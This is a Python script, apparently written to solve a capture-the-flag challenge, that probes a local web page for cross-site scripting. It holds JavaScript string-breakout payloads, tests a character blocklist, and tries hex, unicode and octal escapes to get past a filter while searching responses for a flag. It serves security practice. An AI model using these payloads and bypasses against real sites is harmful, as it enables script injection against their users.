import requests
import re

BASE_URL = "http://127.0.0.1:32887/page"

print("="*80)
print("DETAILED ANALYSIS OF FILTER BEHAVIOR")
print("="*80)

# Key observations from previous test:
# 1. All JSFuck characters pass through but regex doesn't find them in JS context
# 2. The response shows the payloads reflected in TEXTAREA and after the form
# 3. Need to look at the actual JavaScript injection context more carefully

# Let's examine the HTML structure more carefully
print("\n### Test 1: Simple payload to understand reflection ###")
response = requests.post(BASE_URL, data={"name": "TEST123"})
print(f"Status: {response.status_code}")
print(f"\nSearching for TEST123 in response:")

# Find all occurrences of TEST123
for i, line in enumerate(response.text.split('\n'), 1):
    if 'TEST123' in line:
        print(f"Line {i}: {line.strip()}")

# Now let's look at what happens with JSFuck payload
print("\n\n### Test 2: JSFuck payload reflection ###")
response = requests.post(BASE_URL, data={"name": '";alert(1);//'})
print(f"Status: {response.status_code}")
print(f"\nSearching for alert in response:")

for i, line in enumerate(response.text.split('\n'), 1):
    if 'alert' in line.lower() or 'var name' in line:
        print(f"Line {i}: {line.strip()}")

# Test if the filter is character-based
print("\n\n### Test 3: Character blocklist detection ###")
blocked_chars = []
test_chars = "abcdefghijklmnopqrstuvwxyz"

for char in test_chars:
    response = requests.post(BASE_URL, data={"name": f'";{char};//'})
    if "Sorry you can't use" in response.text:
        # Extract what character is blocked
        match = re.search(r"Sorry you can't use: '(.)'", response.text)
        if match:
            blocked = match.group(1)
            blocked_chars.append(blocked)
            print(f"'{char}' triggers block of: '{blocked}'")

print(f"\n✗ Blocked characters: {blocked_chars}")
print(f"✓ Allowed characters (from a-z): {[c for c in test_chars if c not in blocked_chars]}")

# Test encoding methods
print("\n\n### Test 4: Encoding bypass attempts ###")

encoding_tests = [
    ('";\\x61;//', "Hex escape for 'a'"),
    ('";\\u0061;//', "Unicode escape for 'a'"),
    ('";\\141;//', "Octal escape for 'a'"),
    ('";\\x3cimg src=x\\x3e;//', "Hex-encoded angle brackets"),
    ('";eval\\x28\\x29;//', "eval with hex parens"),
    ('";\\x5B\\x5D;//', "Hex-encoded []"),
]

for payload, desc in encoding_tests:
    response = requests.post(BASE_URL, data={"name": payload})
    print(f"\n{desc}")
    print(f"Payload: {payload}")
    
    if "Sorry you can't use" in response.text:
        print("✗ BLOCKED by filter")
    elif 'var name' in response.text:
        # Extract what's in the JavaScript
        match = re.search(r'var name = "([^"]*)";', response.text)
        if match:
            reflected = match.group(1)
            print(f"✓ ALLOWED - Reflected as: {reflected}")
    else:
        print("? Unknown response")

# Test if we can break out of the string context
print("\n\n### Test 5: String escape attempts ###")

escape_tests = [
    ('";\\u0022;//', "Unicode quote"),
    ('";\\x22;//', "Hex quote"),
    ('";\\042;//', "Octal quote"),
    ('\\u0022;alert(1);//', "Unicode quote at start"),
    ('\\x22;alert(1);//', "Hex quote at start"),
]

for payload, desc in escape_tests:
    response = requests.post(BASE_URL, data={"name": payload})
    print(f"\n{desc}")
    print(f"Payload: {payload}")
    
    if "Sorry you can't use" in response.text:
        match = re.search(r"Sorry you can't use: '(.)'", response.text)
        blocked = match.group(1) if match else "?"
        print(f"✗ BLOCKED (character '{blocked}')")
    elif 'var name' in response.text:
        match = re.search(r'var name = "([^"]*)";', response.text)
        if match:
            reflected = match.group(1)
            print(f"✓ ALLOWED - Reflected as: {reflected}")
            # Check if it would execute as JS
            if reflected == payload:
                print("  → Payload intact, might execute!")
    else:
        print("? Unknown response")

print("\n\n### Test 6: Look for FLAGS in responses ###")
# Sometimes flags appear in error messages or specific responses
test_payloads = ['";', '"', ';', '//', '\\', '"];//']

for payload in test_payloads:
    response = requests.post(BASE_URL, data={"name": payload})
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        print(f"\n🚩 FLAG FOUND with payload '{payload}': {flag_match.group(0)}")
        print(f"Full response:\n{response.text}")

print("\n" + "="*80)
print("DETAILED ANALYSIS COMPLETE")
print("="*80)

